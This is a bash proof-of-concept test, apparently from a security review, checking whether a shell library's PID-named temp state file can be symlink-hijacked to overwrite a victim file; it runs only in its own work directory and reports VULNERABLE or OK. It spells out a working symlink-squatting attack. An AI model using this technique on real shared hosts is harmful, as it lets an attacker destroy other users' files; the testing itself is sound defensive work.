#!/usr/bin/env bash
# PoC 2 -- DYBATPHO_AI_STATE_FILE defaults to ${TMPDIR:-/tmp}/dybatpho_ai_state_$$
#
# Two properties make that dangerous on a shared host:
#   1. the name is fully predictable -- the only variable is the PID, which is
#      public (ps) and drawn from a small space, so an attacker just pre-creates
#      a symlink for every plausible PID and waits;
#   2. the library writes it with a plain `>` redirection, which follows a
#      symlink, so the write lands on whatever the attacker pointed it at.
#
# This models the attacker having already won step 1, and then measures step 2:
# does the library clobber the file the symlink points to?
set -uo pipefail

ROOT="${1:?usage: poc2_state_symlink.sh <repo-root> <workdir>}"
WORK="${2:?usage: poc2_state_symlink.sh <repo-root> <workdir>}"

rm -rf "${WORK}"
mkdir -p "${WORK}/tmp"

VICTIM="${WORK}/victim.txt"
printf 'important data the attacker wants destroyed\n' > "${VICTIM}"

# The child announces the path the library will use, then waits for the
# attacker before doing anything with it.
cat > "${WORK}/child.sh" << 'CHILD'
#!/usr/bin/env bash
set -uo pipefail
ROOT="$1"; WORK="$2"
export TMPDIR="${WORK}/tmp"
export LOG_LEVEL=fatal
# shellcheck disable=SC1090
source "${ROOT}/init.sh" --modules ai
# Announce where the state file will live, exactly as the defaults resolve it.
# Ask the library where it will write, the way it resolves it itself.
if declare -F __dybatpho_ai_state_path > /dev/null; then
  __dybatpho_ai_state_path > "${WORK}/predicted_path"
else
  printf '%s\n' "${DYBATPHO_AI_STATE_FILE}" > "${WORK}/predicted_path"
fi
# Wait for the attacker to plant the symlink.
while [[ ! -e "${WORK}/attacker_ready" ]]; do sleep 0.05; done
# Normal, innocent use of the library.
dybatpho::ai_usage_reset > /dev/null 2>&1 || true
printf 'done\n' > "${WORK}/child_done"
CHILD
chmod +x "${WORK}/child.sh"

bash "${WORK}/child.sh" "${ROOT}" "${WORK}" &
CHILD_PID=$!

# Attacker: wait for the path, plant the symlink, signal the child.
for _ in $(seq 1 200); do
  [[ -s "${WORK}/predicted_path" ]] && break
  sleep 0.05
done
if [[ ! -s "${WORK}/predicted_path" ]]; then
  echo "INCONCLUSIVE: the child never reported a state path"
  kill "${CHILD_PID}" 2> /dev/null
  exit 2
fi
STATE_PATH="$(< "${WORK}/predicted_path")"

echo "== the path the library chose =="
echo "    ${STATE_PATH}"
case "${STATE_PATH}" in
  */dybatpho_ai_state_[0-9]*)
    echo "    predictable: it is a fixed prefix plus the PID"
    ;;
  *)
    echo "    not the predictable form"
    ;;
esac

echo
echo "== attacker plants a symlink at that path =="
rm -f "${STATE_PATH}"
ln -s "${VICTIM}" "${STATE_PATH}"
printf '    %s -> %s\n' "${STATE_PATH}" "$(readlink "${STATE_PATH}")"
: > "${WORK}/attacker_ready"

wait "${CHILD_PID}" 2> /dev/null

echo
echo "== the victim file afterwards =="
if [[ ! -s "${VICTIM}" ]] || ! grep -q 'important data' "${VICTIM}"; then
  echo "VULNERABLE: the library followed the symlink and destroyed the target"
  echo "    victim now holds: $(head -c 120 "${VICTIM}")"
  exit 1
fi
echo "OK: the victim file is intact"
echo "    victim still holds: $(head -c 60 "${VICTIM}")"

echo
echo "== where the default actually lives now =="
case "${STATE_PATH}" in
  "${WORK}/tmp/"*)
    echo "    VULNERABLE: still inside the shared temporary directory"
    exit 1
    ;;
  *)
    echo "    ${STATE_PATH}"
    parent="$(dirname "${STATE_PATH}")"
    mode="$(stat -c '%a' "${parent}" 2> /dev/null || stat -f '%Lp' "${parent}" 2> /dev/null)"
    echo "    parent directory mode: ${mode}"
    if ((8#${mode} & 8#022)); then
      echo "    VULNERABLE: the parent directory is writable by others"
      exit 1
    fi
    echo "    only the owner can write there, so the name cannot be squatted"
    ;;
esac
exit 0
